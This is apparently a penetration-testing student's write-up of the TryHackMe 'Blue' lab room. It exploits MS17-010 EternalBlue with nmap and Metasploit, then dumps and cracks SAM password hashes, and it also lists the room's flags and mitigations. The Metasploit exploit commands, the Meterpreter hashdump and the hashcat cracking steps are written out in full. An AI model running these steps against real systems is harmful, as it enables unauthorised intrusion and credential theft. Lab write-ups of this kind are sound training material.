# TryHackMe-Writeups
My walkthroughs and writeups for TryHackMe rooms :D

# TryHackMe - Blue

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue)
![Category](https://img.shields.io/badge/Category-SMB%20%2F%20EternalBlue-red)
![Status](https://img.shields.io/badge/Status-Owned-success)

> Write-up for the **Blue** room on TryHackMe — a beginner-friendly Windows box that walks through the exploitation of the infamous **MS17-010 (EternalBlue)** SMB vulnerability, the same flaw used in the WannaCry ransomware outbreak.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Skills Learned](#skills-learned)
- [Tools Used](#tools-used)
- [1. Reconnaissance](#1-reconnaissance)
- [2. Port Scanning](#2-port-scanning)
- [3. Vulnerability Scanning](#3-vulnerability-scanning)
- [4. Exploitation](#4-exploitation)
- [5. Post-Exploitation](#5-post-exploitation)
- [6. Credential Access](#6-credential-access)
- [7. Flags](#7-flags)
- [Mitigation](#mitigation)
- [Disclaimer](#disclaimer)

---

## Overview

| Item | Detail |
|---|---|
| **Target OS** | Windows 7 Professional SP1 (x64) |
| **Hostname** | JON-PC |
| **Vulnerability** | MS17-010 / EternalBlue (CVE-2017-0143) |
| **Attack Vector** | SMBv1 Remote Code Execution |
| **Final Privilege** | `NT AUTHORITY\SYSTEM` |

---

## Skills Learned

- Host discovery and service enumeration with `nmap`
- Identifying vulnerable SMB services using NSE vulnerability scripts
- Exploiting **MS17-010 (EternalBlue)** via Metasploit
- Migrating a Meterpreter session to a stable process
- Dumping and cracking Windows password hashes (SAM database)
- Basic post-exploitation file system enumeration

---

## Tools Used

| Tool | Purpose |
|---|---|
| `ping` | Host liveness check |
| `nmap` | Port scanning & vulnerability scanning (NSE scripts) |
| `msfconsole` (Metasploit) | Exploitation & post-exploitation |
| `hashcat` | Offline hash cracking |

---

## 1. Reconnaissance

Confirm the target is alive before scanning:

```bash
ping -c5 10.112.133.52
```

```
--- 10.112.133.52 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 64.015/64.352/65.000/0.369 ms
```

✅ Host is up.

---

## 2. Port Scanning

Enumerate open ports and running services:

```bash
nmap -sV 10.112.133.52
```

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152-49165/tcp open msrpc   Microsoft Windows RPC

Service Info: Host: JON-PC; OS: Windows
```

Port **445/tcp (SMB)** stands out as the most interesting attack surface on a legacy Windows host.

---

## 3. Vulnerability Scanning

Run Nmap's vulnerability scripts against the target:

```bash
nmap -sV --script vuln 10.112.133.52
```

Key finding:

```
| smb-vuln-ms17-010:
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
```

The target is confirmed vulnerable to **MS17-010 (EternalBlue)** on port 445.

---

## 4. Exploitation

### 4.1 Launch Metasploit

```bash
msfconsole -q
```

### 4.2 Search for the vulnerability

```
msf > search MS17-010
```

Relevant modules returned:

| # | Module | Type |
|---|---|---|
| 0 | `exploit/windows/smb/ms17_010_eternalblue` | Exploit |
| 10 | `exploit/windows/smb/ms17_010_psexec` | Exploit |
| 19 | `auxiliary/admin/smb/ms17_010_command` | Auxiliary |
| 24 | `auxiliary/scanner/smb/smb_ms17_010` | Scanner |
| 27 | `exploit/windows/smb/smb_doublepulsar_rce` | Exploit |

### 4.3 Module selection rationale

`exploit/windows/smb/ms17_010_eternalblue` was chosen over the alternatives because:

- **Direct match with the Nmap finding** — it targets CVE-2017-0143 exactly as flagged by the vuln scan.
- **Unauthenticated RCE** — unlike `ms17_010_psexec`, which typically needs valid credentials or a named-pipe session, `eternalblue` exploits a kernel pool corruption bug with no prior authentication required.
- **Exploit vs. Auxiliary** — the auxiliary modules only detect or run single commands; an `exploit/` module was needed to establish an interactive Meterpreter session.

### 4.4 Configure and run the exploit

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf > set RHOSTS 10.112.133.52
msf > set LHOST 192.168.156.21
msf > exploit
```

```
[+] 10.112.133.52:445 - The target is vulnerable.
[+] 10.112.133.52:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Meterpreter session 1 opened (192.168.156.21:4444 -> 10.112.133.52:49229)
[+] =-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

🎯 Meterpreter shell obtained.

---

## 5. Post-Exploitation

### 5.1 Background the session

```
meterpreter > <Ctrl+Z>
Background session 1? [y/N]  y
```

```
msf > sessions
  Id  Name  Type                     Information                    Connection
  --  ----  ----                     -----------                    ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC   192.168.156.21:4444 -> 10.112.133.52:49229
```

### 5.2 Process migration (stability)

```
meterpreter > ps
meterpreter > migrate 3064
[*] Migrating from 1280 to 3064...
[*] Migration completed successfully.
```

Migrating into `conhost.exe` keeps the session alive if the original exploited process crashes or is closed.

### 5.3 Confirm privileges

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1)
Architecture    : x64
Domain          : WORKGROUP
```

Full **SYSTEM**-level access achieved — the highest privilege on a Windows host.

---

## 6. Credential Access

Dump the SAM database hashes:

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Crack the NTLM hash offline with `hashcat`:

```bash
hashcat -m 1000 -a 0 ~/Desktop/hash /usr/share/wordlists/rockyou.txt
hashcat --show ~/Desktop/hash
```

```
31d6cfe0d16ae931b73c59d7e0c089c0:          (Administrator — empty password)
ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22  (Jon)
```

| User | Password |
|---|---|
| Administrator | *(blank)* |
| Jon | `alqfna22` |

---

## 7. Flags

| Flag | Location | Value |
|---|---|---|
| Flag 1 | `C:\flag1.txt` | `flag{access_the_machine}` |
| Flag 2 | `C:\Windows\System32\config\flag2.txt` | `flag{sam_database_elevated_access}` |
| Flag 3 | `C:\Users\Jon\Documents\flag3.txt` | `flag{admin_documents_can_be_valuable}` |

```
meterpreter > search -f flag1.txt
meterpreter > search -f flag2.txt
meterpreter > search -f flag3.txt
```

---

## Mitigation

- Disable **SMBv1** entirely; it has been deprecated by Microsoft since this vulnerability class was disclosed.
- Apply the **MS17-010** security patch (available since March 2017) on all legacy systems.
- Segment legacy/unsupported OS versions (e.g., Windows 7) away from production networks.
- Enforce strong, unique local account passwords — the empty Administrator password and weak `Jon` password made post-exploitation trivial here.
- Monitor SMB traffic and deploy IDS/IPS signatures for known EternalBlue exploitation patterns.

---

## Disclaimer

This write-up documents exploitation performed against a **deliberately vulnerable lab machine** (TryHackMe) for educational purposes as part of hands-on penetration testing training (eJPTv2 preparation). None of these techniques should be used against systems without explicit authorization.

---

*Part of my ongoing offensive security / eJPTv2 study track.*

